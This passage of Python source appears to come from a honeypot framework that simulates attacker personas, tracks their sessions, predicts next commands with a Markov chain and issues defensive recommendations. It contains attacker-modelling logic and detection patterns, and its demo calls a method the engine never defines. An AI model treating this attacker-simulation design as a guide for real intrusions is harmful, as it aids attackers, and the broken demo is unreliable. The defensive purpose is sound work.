            "reconnaissance": ReconnaissancePersona,
            "exploitation": ExploitationPersona,
            "exfiltration": ExfiltrationPersona
        }
        
        # Create storage directory if it doesn't exist
        os.makedirs(self.storage_path, exist_ok=True)
        
        # Load existing personas
        self.load_personas()
        
    def create_persona(self, persona_type: str = None, skill_level: str = None) -> PersonaProfile:
        """Create a new persona of the specified type"""
        if not persona_type:
            persona_type = random.choice(list(self.persona_types.keys()))
            
        if persona_type not in self.persona_types:
            raise ValueError(f"Invalid persona type: {persona_type}")
            
        # Create new persona
        persona_class = self.persona_types[persona_type]
        persona = persona_class(skill_level=skill_level)
        
        # Save persona
        self.personas[persona.id] = persona
        self.save_persona(persona)
        
        return persona
        
    def get_persona(self, persona_id: str) -> PersonaProfile:
        """Get a persona by ID"""
        if persona_id in self.personas:
            return self.personas[persona_id]
        
        # Try to load from disk
        persona_file = os.path.join(self.storage_path, f"{persona_id}.json")
        if os.path.exists(persona_file):
            return self.load_persona(persona_file)
            
        return None
        
    def get_random_persona(self, persona_type: str = None, skill_level: str = None) -> PersonaProfile:
        """Get a random persona, optionally filtered by type and skill level"""
        matching_personas = []
        
        for persona in self.personas.values():
            # Check type
            if persona_type and persona.__class__.__name__.lower() != f"{persona_type}persona".lower():
                continue
                
            # Check skill level
            if skill_level and persona.skill_level != skill_level:
                continue
                
            matching_personas.append(persona)
            
        if matching_personas:
            return random.choice(matching_personas)
            
        # No matching persona found, create a new one
        return self.create_persona(persona_type, skill_level)
        
    def save_persona(self, persona: PersonaProfile) -> None:
        """Save a persona to disk"""
        persona_file = os.path.join(self.storage_path, f"{persona.id}.json")
        with open(persona_file, 'w') as f:
            json.dump(persona.to_dict(), f, indent=2)
            
    def load_persona(self, persona_file: str) -> PersonaProfile:
        """Load a persona from disk"""
        with open(persona_file, 'r') as f:
            data = json.load(f)
            
        # Determine persona type based on objectives
        persona_type = "reconnaissance"  # default
        if "privilege_escalation" in data.get("objectives", []):
            persona_type = "exploitation"
        elif "data_exfiltration" in data.get("objectives", []):
            persona_type = "exfiltration"
            
        # Create and populate persona
        persona_class = self.persona_types[persona_type]
        persona = persona_class()
        persona.from_dict(data)
        
        # Store in memory
        self.personas[persona.id] = persona
        
        return persona
        
    def load_personas(self) -> None:
        """Load all personas from disk"""
        if not os.path.exists(self.storage_path):
            return
            
        for filename in os.listdir(self.storage_path):
            if filename.endswith(".json"):
                persona_file = os.path.join(self.storage_path, filename)
                try:
                    self.load_persona(persona_file)
                except Exception as e:
                    logger.error(f"Error loading persona from {persona_file}: {str(e)}")
                    
    def update_persona(self, persona: PersonaProfile) -> None:
        """Update a persona in storage"""
        self.personas[persona.id] = persona
        self.save_persona(persona)
        
    def delete_persona(self, persona_id: str) -> bool:
        """Delete a persona"""
        if persona_id in self.personas:
            del self.personas[persona_id]
            
        persona_file = os.path.join(self.storage_path, f"{persona_id}.json")
        if os.path.exists(persona_file):
            os.remove(persona_file)
            return True
            
        return False


class PersonaEngagementEngine:
    """Engine for managing persona engagements with honeypots"""
    
    def __init__(self, persona_manager: PersonaManager):
        self.persona_manager = persona_manager
        self.active_engagements = {}  # session_id -> engagement_data
        self.engagement_history = []
        self.lock = threading.Lock()
        
    def start_engagement(self, session_id: str, protocol: str, client_ip: str, 
                         system_type: str = "linux", persona_type: str = None, 
                         skill_level: str = None) -> Dict[str, Any]:
        """Start a new engagement with a persona"""
        with self.lock:
            # Check if engagement already exists
            if session_id in self.active_engagements:
                return self.active_engagements[session_id]
                
            # Get a persona
            persona = self.persona_manager.get_random_persona(persona_type, skill_level)
            
            # Create engagement data
            engagement = {
                "session_id": session_id,
                "persona_id": persona.id,
                "protocol": protocol,
                "client_ip": client_ip,
                "system_type": system_type,
                "start_time": datetime.now().isoformat(),
                "last_activity": datetime.now().isoformat(),
                "commands_executed": [],
                "access_level": "none",
                "context": {
                    "system_type": system_type,
                    "access_level": "none",
                    "target_ip": client_ip,
                    "attacker_ip": f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}",
                    "discovered_info": {},
                    "discovered_vulnerabilities": []
                }
            }
            
            # Store engagement
            self.active_engagements[session_id] = engagement
            
            # Update persona history
            persona.update_history(session_id, "engagement_start", {
                "protocol": protocol,
                "client_ip": client_ip,
                "system_type": system_type
            })
            self.persona_manager.update_persona(persona)
            
            return engagement
            
    def end_engagement(self, session_id: str) -> None:
        """End an active engagement"""
        with self.lock:
            if session_id not in self.active_engagements:
                return
                
            engagement = self.active_engagements[session_id]
            engagement["end_time"] = datetime.now().isoformat()
            
            # Update persona history
            persona = self.persona_manager.get_persona(engagement["persona_id"])
            if persona:
                persona.update_history(session_id, "engagement_end", {
                    "commands_executed": len(engagement["commands_executed"]),
                    "duration": (datetime.fromisoformat(engagement["end_time"]) - 
                               datetime.fromisoformat(engagement["start_time"])).total_seconds()
                })
                self.persona_manager.update_persona(persona)
                
            # Archive engagement
            self.engagement_history.append(engagement)
            
            # Remove from active engagements
            del self.active_engagements[session_id]
            
    def get_next_action(self, session_id: str) -> Dict[str, Any]:
        """Get the next action for an engagement"""
        with self.lock:
            if session_id not in self.active_engagements:
                return None
                
            engagement = self.active_engagements[session_id]
            persona = self.persona_manager.get_persona(engagement["persona_id"])
            
            if not persona:
                return None
                
            # Generate next action
            action = persona.generate_next_action(engagement["context"])
            
            # Update engagement data
            engagement["last_activity"] = datetime.now().isoformat()
            
            return action
            
    def record_command_result(self, session_id: str, command: str, output: str, success: bool = True) -> None:
        """Record the result of a command execution"""
        with self.lock:
            if session_id not in self.active_engagements:
                return
                
            engagement = self.active_engagements[session_id]
            persona = self.persona_manager.get_persona(engagement["persona_id"])
            
            if not persona:
                return
                
            # Record command
            engagement["commands_executed"].append({
                "timestamp": datetime.now().isoformat(),
                "command": command,
                "output": output,
                "success": success
            })
            
            # Update engagement context
            self._update_context_from_command(engagement, command, output, success)
            
            # Update persona
            persona.learn_from_interaction(command, output, success)
            persona.update_history(session_id, "command_execution", {
                "command": command,
                "success": success
            })
            self.persona_manager.update_persona(persona)
            
    def _update_context_from_command(self, engagement: Dict[str, Any], command: str, output: str, success: bool) -> None:
        """Update engagement context based on command output"""
        context = engagement["context"]
        
        # Check for successful login/auth
        auth_patterns = ["login successful", "access granted", "welcome to", "logged in"]
        if any(p in output.lower() for p in auth_patterns) or "Last login:" in output:
            context["access_level"] = "user"
            
        # Check for privileged access
        if context["access_level"] == "user":
            root_patterns = ["uid=0", "root@", "#", "Administrator\\"]
            if any(p in output for p in root_patterns):
                context["access_level"] = "root" if context["system_type"] == "linux" else "admin"
                
        # Extract discovered information
        if "discovered_info" not in context:
            context["discovered_info"] = {}
            
        # Extract IPs
        ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', output)
        if ips:
            if "ips" not in context["discovered_info"]:
                context["discovered_info"]["ips"] = []
            context["discovered_info"]["ips"].extend([ip for ip in ips if ip not in context["discovered_info"]["ips"]])
            
        # Extract usernames
        usernames = re.findall(r'\b[a-zA-Z0-9_-]{2,20}:[x*]:\d+:\d+:', output)
        if usernames:
            if "users" not in context["discovered_info"]:
                context["discovered_info"]["users"] = []
            extracted = [u.split(':')[0] for u in usernames]
            context["discovered_info"]["users"].extend([u for u in extracted if u not in context["discovered_info"]["users"]])
            
        # Extract potential vulnerabilities
        vuln_keywords = ["CVE-", "vulnerability", "exploit", "outdated", "unpatched"]
        if any(k in output for k in vuln_keywords):
            if "discovered_vulnerabilities" not in context:
                context["discovered_vulnerabilities"] = []
            # Extract CVEs
            cves = re.findall(r'CVE-\d{4}-\d{4,7}', output)
            context["discovered_vulnerabilities"].extend([cve for cve in cves if cve not in context["discovered_vulnerabilities"]])


class MarkovChainPredictor:
    """Predicts attacker next steps using Markov chain analysis"""
    
    def __init__(self, persona_manager: PersonaManager):
        self.persona_manager = persona_manager
        self.transition_matrix = {}  # command -> {next_command: count}
        self.command_counts = {}  # command -> count
        self.build_transition_matrix()
        
    def build_transition_matrix(self) -> None:
        """Build transition matrix from all persona histories"""
        # Reset matrices
        self.transition_matrix = {}
        self.command_counts = {}
        
        # Process all personas
        for persona_id, persona in self.persona_manager.personas.items():
            # Extract commands from history
            commands = []
            for entry in persona.engagement_history:
                if "details" in entry and "command" in entry["details"]:
                    commands.append(entry["details"]["command"])
                    
            # Build transitions
            for i in range(len(commands) - 1):
                current = commands[i]
                next_cmd = commands[i + 1]
                
                if current not in self.transition_matrix:
                    self.transition_matrix[current] = {}
                    
                if next_cmd not in self.transition_matrix[current]:
                    self.transition_matrix[current][next_cmd] = 0
                    
                self.transition_matrix[current][next_cmd] += 1
                
                # Update command counts
                if current not in self.command_counts:
                    self.command_counts[current] = 0
                self.command_counts[current] += 1
                
    def predict_next_commands(self, current_command: str, n: int = 3) -> List[Tuple[str, float]]:
        """Predict the n most likely next commands given the current command"""
        if current_command not in self.transition_matrix:
            # No data for this command, return empty list
            return []
            
        transitions = self.transition_matrix[current_command]
        total = sum(transitions.values())
        
        # Calculate probabilities
        probabilities = [(cmd, count / total) for cmd, count in transitions.items()]
        
        # Sort by probability (descending) and take top n
        return sorted(probabilities, key=lambda x: x[1], reverse=True)[:n]
        
    def generate_threat_prediction(self, session_id: str, engagement_engine: PersonaEngagementEngine) -> Dict[str, Any]:
        """Generate a threat prediction report for a given session"""
        if session_id not in engagement_engine.active_engagements:
            return {"error": "Session not found"}
            
        engagement = engagement_engine.active_engagements[session_id]
        commands = [entry["command"] for entry in engagement["commands_executed"]]
        
        if not commands:
            return {"error": "No commands executed in this session"}
            
        # Get most recent command
        current_command = commands[-1]
        
        # Predict next commands
        predictions = self.predict_next_commands(current_command)
        
        # Determine likely objectives
        persona = self.persona_manager.get_persona(engagement["persona_id"])
        objectives = persona.objectives if persona else ["unknown"]
        
        # Calculate threat score (0-100)
        threat_score = 0
        if persona:
            # Base on skill level
            skill_level_scores = {"novice": 30, "intermediate": 60, "expert": 90}
            threat_score = skill_level_scores.get(persona.skill_level, 50)
            
            # Adjust based on access level
            if engagement["access_level"] == "root" or engagement["access_level"] == "admin":
                threat_score += 10
                
            # Cap at 100
            threat_score = min(threat_score, 100)
            
        return {
            "session_id": session_id,
            "client_ip": engagement["client_ip"],
            "persona_name": persona.name if persona else "Unknown",
            "skill_level": persona.skill_level if persona else "unknown",
            "access_level": engagement["access_level"],
            "predicted_next_commands": [{"command": cmd, "probability": prob} for cmd, prob in predictions],
            "likely_objectives": objectives,
            "threat_score": threat_score,
            "recommended_actions": self._generate_recommendations(engagement, persona, threat_score)
        }
        
    def _generate_recommendations(self, engagement: Dict[str, Any], persona: PersonaProfile, threat_score: float) -> List[str]:
        """Generate recommendations based on the threat assessment"""
        recommendations = []
        
        if threat_score >= 80:
            recommendations.append("Immediate isolation of affected systems")
            recommendations.append("Block the source IP address at the firewall")
            recommendations.append("Preserve all logs and activity for forensic analysis")
        elif threat_score >= 50:
            recommendations.append("Increase monitoring of this session")
            recommendations.append("Prepare for potential escalation")
            recommendations.append("Review recent activities for signs of compromise")
        else:
            recommendations.append("Standard monitoring")
            recommendations.append("Log all activities for later analysis")
            
        # Add objective-specific recommendations
        if persona and "data_exfiltration" in persona.objectives:
            recommendations.append("Monitor for unusual data transfers or network traffic")
            
        if persona and "persistence_establishment" in persona.objectives:
            recommendations.append("Scan for newly created accounts, scheduled tasks, or services")
            
        if engagement["access_level"] in ["root", "admin"]:
            recommendations.append("Prepare for potential lateral movement or privilege abuse")
            
        return recommendations


# Initialize the core components
persona_manager = PersonaManager()
engagement_engine = PersonaEngagementEngine(persona_manager)
predictor = MarkovChainPredictor(persona_manager)

# Create some initial personas if none exist
if not persona_manager.personas:
    logger.info("Creating initial personas...")
    for persona_type in ["reconnaissance", "exploitation", "exfiltration"]:
        for skill_level in ["novice", "intermediate", "expert"]:
            persona_manager.create_persona(persona_type, skill_level)
    logger.info(f"Created {len(persona_manager.personas)} initial personas")

# Example usage function
def simulate_engagement(protocol="ssh", system_type="linux", skill_level="expert"):
    """Simulate an engagement for testing"""
    session_id = str(uuid.uuid4())
    client_ip = f"192.168.1.{random.randint(2, 254)}"
    
    # Start engagement
    engagement = engagement_engine.start_engagement(
        session_id=session_id,
        protocol=protocol,
        client_ip=client_ip,
        system_type=system_type,
        skill_level=skill_level
    )
    
    # Get initial action
    action = engagement_engine.get_next_action(session_id)
    print(f"Initial action: {action}")
    
    # Simulate some command executions
    for _ in range(5):
        cmd = action["command"]
        # Simulate command output
        output = f"Simulated output for {cmd}"
        
        # Process with engagement engine
        action = engagement_engine.process_command_output(session_id, cmd, output, success=True)
        print(f"Next action: {action}")
    
    print("\n✅ AI Personas demo completed!")